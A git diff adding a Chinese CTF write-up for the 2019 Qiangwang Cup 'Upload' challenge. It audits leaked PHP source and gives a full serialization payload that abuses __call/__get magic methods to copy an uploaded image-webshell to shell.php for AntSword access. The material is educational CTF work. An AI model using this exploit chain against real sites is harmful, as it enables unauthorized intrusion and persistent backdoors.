@@ -1370,6 +1370,108 @@ so:
 
     然后把构造好的payload post传入后台，如果页面出现10-0，则表示执行成功，去登录界面登录，用户名admin，密码随意，拿到flag。
 
+#### 强网杯 2019 Upload(文件上传)
+
+1. 刚打开发现是登录注册页面，因为题目提示upload所以猜测应该和sql注入没关系，所以直接注册登录，发现了文件上传点，一开始直接传了一个木马，没成功，传了一个图片马，成功了，但是没法执行，后台回修改文件名
+2. 没思路了，就想着扫一下目录吧，发现了`www.tar.gz`,源码泄露，有`.idea`文件，用phpstorm打开(仅打开当前项目所在文件夹)，有两个断点提示。
+    ![断点1](./image/index.png)
+    ![断点2](./image/register.png)
+    审计第一处断点所在文件，发现会利用cookie反序列化，所以这应该是一个利用点
+
+    application/web/controller/Index.php 里的：
+    首先访问大部分页面例如 `index` 都会调用 `login_check` 方法。
+    该方法会先将传入的用户 `Profile` 反序列化，而后到数据库中检查相关信息是否一致。
+
+    `application/web/controller/Register.php` 里的：
+    `Register` 的析构方法，判断注没注册，没注册的给调用 `check` 也就是 `Index` 的 `index` 方法，即跳到主页。
+
+    [源码](./code/强网杯2019upload/)
+
+    接着审计上传逻辑代码
+    ```php
+    public function upload_img(){
+        if($this->checker){
+            if(!$this->checker->login_check()){
+                $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
+                $this->redirect($curr_url,302);
+                exit();
+            }
+        }
+
+        if(!empty($_FILES)){
+            $this->filename_tmp=$_FILES['upload_file']['tmp_name'];
+            $this->filename=md5($_FILES['upload_file']['name']).".png";
+            $this->ext_check();
+        }
+        if($this->ext) {
+            if(getimagesize($this->filename_tmp)) {
+                @copy($this->filename_tmp, $this->filename);
+                @unlink($this->filename_tmp);
+                $this->img="../upload/$this->upload_menu/$this->filename";
+                $this->update_img();
+            }else{
+                $this->error('Forbidden type!', url('../index'));
+            }
+        }else{
+            $this->error('Unknow file type!', url('../index'));
+        }
+    }
+    ```
+    第一步先判断是否登录；通过后第二步判断是否上传文件，然后验证后缀名，验证函数如下，png返回1，否则返回0；
+    ```php
+    public function ext_check(){
+        $ext_arr=explode(".",$this->filename);
+        $this->ext=end($ext_arr);
+        if($this->ext=="png"){
+            return 1;
+        }else{
+            return 0;
+        }
+    }
+    ```
+    后缀名验证通过后把复制文件到upload目录下，所以我们就可以利用这个函数把我们没第一次上传的图片马的内容复制到php文件中。所以下一步就是想办法调用这个函数。
+
+    而 Profile 有 _call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。_get 会直接从 except 里找，_call 会调用自身的 name 成员变量所指代的变量所指代的方法。
+
+    这时候再回头看作者给的第二个断点，利用 $this->checker->index();触发__call，这时候在__call中又会调用不存在的方法index，触发了__get。我们设置$except = ['index' => 'upload_img']，这样就会调用upload_img方法了。
+
+    payload：
+    ```php
+    <?php
+    namespace app\web\controller;
+    error_reporting(0);
+
+    class Register{
+        public $checker;
+        public $registed;
+    }
+
+    class Profile{
+        public $checker;
+        public $filename_tmp;
+        public $filename;
+        public $upload_menu;
+        public $ext;
+        public $img;
+        public $except;
+    }
+
+    $profile = new Profile();
+    $profile->checker = 0;
+    $profile->ext = 1;
+    $profile->except = ['index'=>'upload_img'];
+    $profile->filename_tmp = './upload/1254adea244b6ef09ecedbb729f6c397/87328f29c1073c486f19bf593fbbefb1.png';
+    $profile->filename = './upload/shell.php';
+
+    $register = new Register();
+    $register->registed = 0;
+    $register->checker = $profile;
+
+    echo base64_encode(serialize($register));
+    ```
+
+    *注意先上传图片马，然后修改cookie，重新访问一下，使用蚁剑连接filename指示的路径*
+
 ### 类型四-phar反序列化
 
 1. phar反序列化
